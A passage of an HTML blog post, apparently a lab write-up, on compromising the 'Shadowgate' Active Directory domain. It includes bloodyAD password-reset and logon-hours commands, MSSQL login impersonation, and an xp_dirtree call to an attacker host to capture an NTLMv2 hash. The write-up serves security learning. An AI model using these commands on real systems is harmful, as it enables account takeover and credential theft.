+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_9c2852c94d6c1d4e.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_9ba511b78b85ea0b.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control_hu_9c2852c94d6c1d4e.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control.png 931w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/dacl-full-control.png 931w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>With full control over the account, I reset its password.</p>
+<pre tabindex="0"><code>bloodyAD --host 10.1.44.124 -d shadowgate.local -u milo.w -p &#39;&lt;REDACTED&gt;&#39; set password &#39;svc_mssql&#39; &#39;&lt;REDACTED&gt;&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_499f83ee2d3390e1.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_6a0f311094b5e47.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_856404233d5718c5.webp 949w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_856404233d5718c5.webp 949w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="949"
+        height="116"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_5391916e83ec5ee7.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_8e5021aff464d80.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change_hu_5391916e83ec5ee7.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change.png 949w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-password-change.png 949w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-5-lateral-movement-via-mssql" class="relative group">Step 5: Lateral Movement via MSSQL <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-lateral-movement-via-mssql" aria-label="Anchor">#</a></span></h2><p>I tested the new <code>svc_mssql</code> credentials and confirmed they work.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_4868b64c2afce507.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_76bff9da2dba13ef.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_7eabdc7b111bd944.webp 942w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_7eabdc7b111bd944.webp 942w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="942"
+        height="81"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_c33042a95a6917cd.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_9afc95597b783208.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify_hu_c33042a95a6917cd.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify.png 942w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-verify.png 942w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>BloodHound revealed that <code>svc_mssql</code> can impersonate the <code>SHADOWGATE\bogdan.r</code> user.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_29ee54fb6050e05b.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_54ce9ed1ab4752a0.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_18fb217383588517.webp 942w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_18fb217383588517.webp 942w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="942"
+        height="108"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_6231505ad8bf57a1.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_9b355fda03fedbe.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation_hu_6231505ad8bf57a1.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation.png 942w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/svc-mssql-impersonation.png 942w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>SQL Server logins with the <strong>IMPERSONATE</strong> privilege can execute commands in the context of another login, such as the system administrator (<code>sa</code>) account, potentially escalating privileges.</p>
+<p>Authenticating to the MSSQL instance:</p>
+<pre tabindex="0"><code>/usr/bin/python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py &#39;shadowgate.local/svc_mssql:&lt;REDACTED&gt;@10.1.44.124&#39; -windows-auth
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_6931ea411edcf2fb.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_69ac953d45ae2387.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_5ea82c4b15f18065.webp 974w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_5ea82c4b15f18065.webp 974w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="974"
+        height="231"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_bff6c89c999ef7f0.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_35575a42b4d20fb7.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth_hu_bff6c89c999ef7f0.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth.png 974w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/mssql-auth.png 974w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Executing commands as <code>bogdan.r</code>:</p>
+<pre tabindex="0"><code>EXECUTE AS LOGIN = &#39;SHADOWGATE\bogdan.r&#39;;
+SELECT SYSTEM_USER;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_389b0bc5512759a8.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_ce14b82fac966e68.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_a7fd3704f9cbcc67.webp 960w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_a7fd3704f9cbcc67.webp 960w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="960"
+        height="404"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_c541c6bd8215fb5c.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_fae8da015bd98a8e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin_hu_c541c6bd8215fb5c.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin.png 960w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-not-sysadmin.png 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The user is not a sysadmin and has almost no rights inside SQL Server itself, so it cannot be used for direct escalation — but the MSSQL service account context can be used to capture credentials. BloodHound showed that <code>bogdan.r</code> is part of the Remote Management group and has outbound object control.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-groups_hu_d94c765b375a1ae0.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="411"
+        height="222"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-groups.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="ntlmv2-capture-via-xp_dirtree" class="relative group">NTLMv2 Capture via xp_dirtree <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ntlmv2-capture-via-xp_dirtree" aria-label="Anchor">#</a></span></h3><p><code>xp_dirtree</code> is an undocumented SQL Server extended stored procedure that lists the structure of a local or remote directory. It runs using the security context of the MSSQL service account, making it a classic relay point for hash capture.</p>
+<pre tabindex="0"><code>EXEC xp_dirtree &#39;\\10.200.77.181\share&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_a1433782fe83d3c6.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_bb8ae2a539998ad0.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_9a735f5dcde4ef74.webp 783w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_9a735f5dcde4ef74.webp 783w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="783"
+        height="133"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_bf85d2e21193e219.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_d25fde5d95c3b4b5.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree_hu_bf85d2e21193e219.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree.png 783w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/xp-dirtree.png 783w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I captured the hash of the MSSQL service account (running as <code>bogdan.r</code>).</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_25f498e08df7fefb.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_5e73993ccec21829.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_17534d96274e6212.webp 945w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_17534d96274e6212.webp 945w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="945"
+        height="182"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_15d491f5b9e612af.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_eb522a3ccc61906.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured_hu_15d491f5b9e612af.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured.png 945w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/ntlmv2-captured.png 945w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I cracked the captured hash, yielding the plaintext password for <code>bogdan.r</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_ebaeff64e3d7c34d.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_eddede6815c3c755.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_e6105d0250eafa92.webp 939w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_e6105d0250eafa92.webp 939w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="939"
+        height="151"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_4ca60d4158474eaf.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_3492b6dfec235599.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked_hu_4ca60d4158474eaf.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked.png 939w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-hash-cracked.png 939w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>BloodHound showed that <code>bogdan.r</code> has <strong>GenericAll</strong> over two users.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_e3151c6a8ac338de.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_e0ef8f4e347df39f.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_ae948b42e88d149.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_40647df56c6de3d0.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1330"
+        height="473"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_fa12161b72fbcf34.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_24f6f00328385dcd.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_fa12161b72fbcf34.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_6260d2aeca0898e2.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bogdan-genericall_hu_6e9b8acddc0294ea.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I abused this to reset the passwords of both users.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_5cef6579c6f07a76.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_e95834100f125eeb.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_d75719d2c215cd79.webp 948w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_d75719d2c215cd79.webp 948w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="948"
+        height="138"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_a16a444433e1c202.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_5de20cc538787b2e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users_hu_a16a444433e1c202.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users.png 948w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/password-reset-users.png 948w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p><code>daniel.r</code> turned out to be a normal user account with no special permissions or group memberships.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_a2008a3b2fa66727.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_4723ab9db30b71e2.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_80f02f0855b56880.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_4eff18a2f18b43ab.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1499"
+        height="237"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_988c6037d6c0ddea.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_a3f1531e0011ff9a.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_988c6037d6c0ddea.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_e74f3af0c13eb3ae.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/daniel-normal-user_hu_2d597e713622f48e.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p><code>oscar.m</code> however has remote access rights, so it warranted further investigation.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_34d3f166a0ddd783.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_5cb422592ecd6e56.webp 660w
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_e643dc5df9fbdf1.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_d5ef1eafe65d2d65.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1566"
+        height="508"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_daace930daa8b6b4.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_a2b2b70b899d1def.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_daace930daa8b6b4.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_e5bca88b858c6ec0.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/oscar-remote-access_hu_19de3c86edcf9e50.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I attempted to authenticate, which revealed that the account has logon-hours restrictions in place.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_41293eaba3551f41.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_d8cd7c2accc68321.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_d7f6592acfa3db89.webp 963w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_d7f6592acfa3db89.webp 963w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="963"
+        height="105"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_21adf48275c7fe62.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_6b4d0e149369879e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction_hu_21adf48275c7fe62.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction.png 963w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-hours-restriction.png 963w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Since I control the account, I cleared the logon hours using <strong>BloodyAD</strong>.</p>
+<pre tabindex="0"><code>bloodyAD --host 10.1.44.124 -d shadowgate.local -u bogdan.r -p &#39;&lt;REDACTED&gt;&#39; set object oscar.m logonHours
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_64465845cbac929f.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_a9e7c6e007f91cac.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_c3de25e82e2b670e.webp 937w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_c3de25e82e2b670e.webp 937w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="937"
+        height="108"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_93afdc237efaf157.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_ab55267bf7b850cc.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours_hu_93afdc237efaf157.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours.png 937w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/bypass-logon-hours.png 937w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Authentication now succeeded, and I captured the user flag.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_3fcbd3d44d5cb6d3.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_4c4996bf74e90638.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_6ab2c2b7e63f9893.webp 960w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_6ab2c2b7e63f9893.webp 960w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="960"
+        height="106"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_561fb600cd3f4f89.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_34413e146b52c364.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success_hu_561fb600cd3f4f89.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success.png 960w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/logon-success.png 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_1017dd9a0290e04f.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_21d6a7683afed207.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_62842039cc98342c.webp 979w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_62842039cc98342c.webp 979w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="979"
+        height="228"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_fd873c3ffaf4ff12.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_f262507a1cef00e.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag_hu_fd873c3ffaf4ff12.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag.png 979w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/user-flag.png 979w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-6-adcs-attack--esc3-to-domain-admin" class="relative group">Step 6: ADCS Attack — ESC3 to Domain Admin <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-6-adcs-attack--esc3-to-domain-admin" aria-label="Anchor">#</a></span></h2><p>While enumerating the website, I noticed a note mentioning an employee who had left the company whose role was <em>certificate manager &amp; enrollment agent</em>. This hinted at an ADCS attack.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
